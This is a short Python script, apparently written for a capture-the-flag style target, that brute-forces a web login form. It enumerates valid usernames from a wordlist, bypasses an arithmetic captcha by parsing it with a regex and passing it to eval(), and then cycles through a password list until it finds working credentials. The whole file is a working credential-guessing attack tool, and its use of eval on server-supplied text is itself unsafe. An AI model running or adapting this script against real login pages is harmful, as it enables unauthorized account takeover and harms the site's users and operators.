#!/usr/bin/python3

# author : a4chr0f

import re
import sys
from requests import Session

data = { 
    'username': '', 
    'password': '',                                                                                                                                                                                                                         
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0',                                                                                                                                         
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',                                                                                                                                      
    'Accept-Language': 'en-US,en;q=0.5',                                                                                                                                                                                                    
    'Accept-Encoding': 'gzip, deflate',                                                                                                                                                                                                     
    'Content-Type': 'application/x-www-form-urlencoded'                                                                                                                                                                                     
}   

def solve_captcha(response):
 
  bi_captcha = re.compile(r'(\s\s\d+\s[+*-/]\s\d+)\s\=\s\?')
  captcha = bi_captcha.findall(response)
  #qprint(captcha)
  return eval(' '.join(captcha))

def fuzzer(url,data_template,fileuser,filepass):
    lista = []
    listapass = []

    with open(fileuser, 'r') as file:
        data = file.readline()
        while data != '':
            data = data.replace('\n','')
            lista.append(data)
            data = file.readline()
    with open(filepass, 'r') as file:
        data = file.readline()
        while data != '':
            data = data.replace('\n','')
            listapass.append(data)
            data = file.readline()

    session = Session()
    print('Iniciando Fuzzer de Fuerza Bruta con Nombres de Usuario')
    for user in lista:
        response = session.post(url, data=data_template)
        data = data_template.copy()
        data['username'] = user

        response = session.post(url, data=data)

        if 'Captcha enabled' in response.text:
            captcha_result = solve_captcha(response.text)
            data['captcha'] = captcha_result
            response = session.post(url, data=data)

        if 'does not exist' not in response.text:
            print(f'Usuario encontrado: {user}')
            print(f'Intentando fuerza bruta de contraseña para el usuario: {user}')
            for passwrd in listapass:

                captcha_result = solve_captcha(response.text)
                data['password'] = passwrd
                data['captcha'] = captcha_result
                response = session.post(url,data=data)
    
                if 'Error' not in response.text:
                    print(f'----> Usuario encontrado: {user} Contraseña: {passwrd} ')
                    exit()

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Uso: python fuzzer.py <url> <archivo_usuarios> <archivo_contraseñas>")
        sys.exit(1)

    url = sys.argv[1]
    fileusername = sys.argv[2]
    filepassword = sys.argv[3]

    fuzzer(url, data, fileusername, filepassword)
